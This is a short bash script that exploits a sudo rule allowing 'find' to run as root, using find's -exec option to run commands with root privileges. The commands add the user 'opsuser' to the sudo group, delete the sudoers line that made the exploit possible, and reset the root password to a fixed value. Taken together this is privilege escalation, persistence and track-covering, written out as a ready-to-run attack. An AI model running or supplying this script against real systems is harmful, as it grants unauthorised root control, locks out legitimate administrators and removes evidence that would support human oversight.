#!/bin/bash

# Exploit the sudo find rule to gain a root shell.
# -maxdepth 0 limits the search so the -exec command runs exactly once
# (instead of once for every file on the filesystem).
sudo find /root -maxdepth 0 -exec /bin/bash -c '
    usermod -aG sudo opsuser
    sed -i "/opsuser ALL=(root) NOPASSWD:.*find/d" /etc/sudoers
    echo "root:BrokenOps123" | chpasswd
' \;